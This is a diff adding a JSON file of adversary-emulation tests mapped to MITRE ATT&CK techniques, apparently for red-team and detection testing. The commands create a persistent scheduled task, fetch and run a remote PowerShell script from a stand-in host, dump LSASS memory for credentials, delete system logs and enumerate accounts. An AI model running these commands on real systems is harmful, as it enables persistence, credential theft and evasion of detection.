@@ -1,0 +1,75 @@
+{
+  "T1053.005": {
+    "name": "Scheduled Task",
+    "tests": [
+      {
+        "id": 1,
+        "name": "Create a new scheduled task",
+        "description": "Uses schtasks to create a persistent task.",
+        "command": "schtasks /create /tn \"AtomicTask\" /tr \"C:\\Windows\\System32\\calc.exe\" /sc daily /st 09:00",
+        "cleanup": "schtasks /delete /tn \"AtomicTask\" /f",
+        "supported_platforms": ["windows"]
+      }
+    ]
+  },
+  "T1059.001": {
+    "name": "PowerShell",
+    "tests": [
+      {
+        "id": 1,
+        "name": "Download and Execute via PowerShell",
+        "description": "Downloads a remote script and executes it in memory.",
+        "command": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
+        "cleanup": "",
+        "supported_platforms": ["windows"]
+      }
+    ]
+  },
+  "T1003.001": {
+    "name": "LSASS Memory",
+    "tests": [
+      {
+        "id": 1,
+        "name": "Dump LSASS via Procdump",
+        "description": "Uses procdump.exe to dump memory of lsass.exe.",
+        "command": "procdump.exe -ma lsass.exe lsass.dmp",
+        "cleanup": "del lsass.dmp",
+        "supported_platforms": ["windows"]
+      }
+    ]
+  },
+  "T1070.004": {
+    "name": "File Deletion",
+    "tests": [
+      {
+        "id": 1,
+        "name": "Delete System Logs",
+        "description": "Deletes common log files to evade detection.",
+        "command": "rm -rf /var/log/syslog",
+        "cleanup": "touch /var/log/syslog",
+        "supported_platforms": ["linux", "macos"]
+      }
+    ]
+  },
+  "T1087.001": {
+    "name": "Local Account Discovery",
+    "tests": [
+      {
+        "id": 1,
+        "name": "Enumerate local users (Windows)",
+        "description": "List all local user accounts.",
+        "command": "net user",
+        "cleanup": "",
+        "supported_platforms": ["windows"]
+      },
+      {
+        "id": 2,
+        "name": "Enumerate local users (Linux)",
+        "description": "List all local user accounts via /etc/passwd.",
+        "command": "cat /etc/passwd",
+        "cleanup": "",
+        "supported_platforms": ["linux"]
+      }
+    ]
+  }
+}
